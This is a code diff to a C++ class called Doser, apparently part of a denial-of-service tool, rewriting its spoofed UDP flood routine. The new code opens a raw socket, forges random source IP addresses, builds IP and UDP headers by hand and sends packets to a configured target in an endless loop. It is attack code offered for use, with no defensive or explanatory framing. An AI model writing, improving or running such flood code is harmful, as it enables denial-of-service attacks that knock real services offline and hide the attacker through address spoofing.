@@ -531,54 +531,62 @@ void Doser::spoofed_tcp_flood(const int *id) {
 void Doser::spoofed_udp_flood(const int *id) {
     int s, on = 1, x;
     std::string message{};
-    char buffer[8192];
+    char buf[8192];
+    auto *ip = (struct ip *)buf;
+    auto *udp = (struct udphdr *)(ip + 1);
+    struct hostent *hp;
+    struct sockaddr_in dst{};
+    auto s_port = randomInt(0, 65535);
     while (true){
         for(x = 0; x < conf->CONNECTIONS; x++){
-            auto s_addr = randomizeIP();
-            auto s_port = randomInt(0, 65535);
-            bzero(buffer, sizeof(buffer));
-            auto *ip = (struct ip *) buffer;
-
-            auto *udp = (struct udphdr *) (buffer + sizeof(struct ip));
-
-            struct sockaddr_in sin{}, din{};
-
-            if((s = socket(AF_UNSPEC, SOCK_RAW, IPPROTO_TCP)) < 0){
+            bzero(buf, sizeof(buf));
+            if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
                 logger->Log("socket() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
-
-            sin.sin_family = AF_UNSPEC;
-            din.sin_family = AF_UNSPEC;
-            sin.sin_port = htons(static_cast<uint16_t>(s_port));
-            din.sin_port = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
-            sin.sin_addr.s_addr = inet_addr(s_addr);
-            din.sin_addr.s_addr = inet_addr(conf->website.c_str());
-
-            // IP Struct
-            ip->ip_hl = 5;
-            ip->ip_v = 4;
-            ip->ip_tos = 16;
-            ip->ip_len = sizeof(struct iphdr) + sizeof(struct udphdr);
-            ip->ip_id = htons(54321);
-            ip->ip_ttl = 64;
-            ip->ip_p = 17;
-            ip->ip_src.s_addr = inet_addr(s_addr);
-            ip->ip_dst.s_addr = inet_addr(conf->website.c_str());
-
-            // UDP Struct
-            udp->source = htons(static_cast<uint16_t>(s_port));
-            udp->dest = htons(*(unsigned short *)conf->port.c_str());
-            udp->len = htons(sizeof(struct udphdr));
-
-            ip->ip_sum = checksum((unsigned short *)buffer, sizeof(struct iphdr) + sizeof(struct udphdr));
 
             if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
                 logger->Log("setsockopt() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
 
-            if(sendto(s, buffer, ip->ip_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
+            if((hp = gethostbyname(conf->website.c_str())) == nullptr){
+                if((ip->ip_dst.s_addr = inet_addr(conf->website.c_str())) < 0){
+                    logger->Log("Can't resolve the host", Logger::Error);
+                    exit(EXIT_FAILURE);
+                }
+            }else{
+                bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, static_cast<size_t>(hp->h_length));
+            }
+            if((ip->ip_src.s_addr = inet_addr(randomizeIP())) < 0){
+                logger->Log("Unable to set random src ip", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            // IP Struct
+            ip->ip_hl = 5;
+            ip->ip_v = 4;
+            ip->ip_tos = 16;
+            ip->ip_len = htons(sizeof(buf));
+            ip->ip_id = static_cast<u_short>(randomInt(1, 1000));
+            ip->ip_ttl = 64;
+            ip->ip_p = 17;
+
+            dst.sin_addr = ip->ip_dst;
+            dst.sin_family = AF_UNSPEC;
+
+            // UDP Struct
+            udp->source = htons(static_cast<uint16_t>(s_port));
+            udp->dest = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
+            udp->len = htons(sizeof(struct udphdr));
+            udp->check = htons(checksum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct udphdr))));
+
+            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
+                logger->Log("setsockopt() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            if(sendto(s, buf, ip->ip_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)) < 0){
                 logger->Log("sendto() error", Logger::Error);
                 exit(EXIT_FAILURE);
             }
